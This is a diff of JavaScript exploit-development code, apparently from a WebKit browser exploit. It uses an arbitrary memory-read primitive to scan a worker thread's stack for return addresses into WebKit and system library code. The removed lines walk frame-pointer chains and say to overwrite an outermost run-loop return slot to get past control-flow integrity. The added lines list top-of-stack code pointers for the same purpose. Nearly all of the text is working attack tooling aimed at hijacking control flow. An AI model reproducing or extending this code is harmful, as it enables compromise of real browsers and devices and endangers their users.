@@ -319,38 +319,32 @@ async function dumpModuleSlots(core, carrier) {
              + "\n\n";
         if (wk0) {
             const st = wk0[1], SZ = 0x80000;
-            // Walk the rbp chain: a live frame is a slot S where [S] is a saved
-            // rbp (higher on the stack) and [S+8] is a WebKit-text return addr.
-            const frame = {};
-            for (let off = 0; off < SZ - 0x10; off += 0x100) {
-                carrier.aim(st + off); const v = carrier.view;
-                for (let j = 0; j < 0x100 && off + j < SZ - 0x10; j += 8) {
-                    const rbp = qw(v, j);
-                    if (rbp <= st + off + j || rbp >= st + SZ || (rbp - st) % 8) continue;
-                    let ret; if (j + 8 < 0x100) ret = qw(v, j + 8); else continue;
-                    if (ret <= base || ret >= base + 0x3673d22) continue;
-                    frame[off + j] = [rbp - st, ret - base];
-                }
+            const WKT = 0x3673d22, LKT = 0x426e2, LCT = 0x171668;
+            // Census the TOP 0x9000 of the stack (the outermost native run-loop
+            // frames, where a parked native return lives). Collect every code
+            // pointer into wk/lk/lc .text with its stack offset.
+            const rows = [];
+            for (let off = SZ - 0x9000; off + 8 <= SZ; off += 8) {
+                let v; try { carrier.aim(st + off); v = carrier.view; } catch (e) { continue; }
+                let q = 0; for (let k = 7; k >= 0; k--) q = q * 256 + v[k];
                 carrier.restore();
+                if (q < 0x100000000 || q > 0xffffffffffff) continue;
+                let tag = null, rva = 0;
+                const rwk = q - base;
+                if (rwk > 0x1000 && rwk < WKT) { tag = "wk"; rva = rwk; }
+                else {
+                    const rlk = q - lk;
+                    if (rlk > 0x1000 && rlk < LKT) { tag = "lk"; rva = rlk; }
+                    else {
+                        const rlc = q - lc;
+                        if (rlc > 0x1000 && rlc < LCT) { tag = "lc"; rva = rlc; }
+                    }
+                }
+                if (tag) rows.push("  stack+0x" + off.toString(16) + "  " + tag
+                    + "+0x" + rva.toString(16));
             }
-            const offs = Object.keys(frame).map(Number).sort(function (x, y) { return x - y; });
-            // longest rbp-linked chain
-            let best = [];
-            for (const o0 of offs) {
-                const chain = []; let o = o0, g = 0;
-                while (frame[o] && g++ < 64) { chain.push(o); const nx = frame[o][0]; if (nx <= o) break; o = nx; }
-                if (chain.length > best.length) best = chain;
-            }
-            out += "idle worker frame chain (" + best.length + " deep), OUTERMOST last:\n";
-            for (let j = 0; j < best.length; j++) {
-                const o = best[j];
-                out += (j === best.length - 1 ? "  OUTERMOST " : "            ")
-                     + "rbp@stack+0x" + o.toString(16)
-                     + "  ret slot stack+0x" + (o + 8).toString(16)
-                     + "  wk+0x" + frame[o][1].toString(16) + "\n";
-            }
-            out += "\nthe OUTERMOST few wk+ addresses are the run-loop return"
-                 + " slots -- overwrite one of those (it is a `ret`, CFI-immune)\n";
+            out += "TOP-OF-STACK code pointers (outermost first is highest off):\n"
+                 + (rows.length ? rows.join("\n") : "  (none)") + "\n";
         }
     } catch (e) {
         out += "worker probe threw: " + (e && e.message) + "\n";
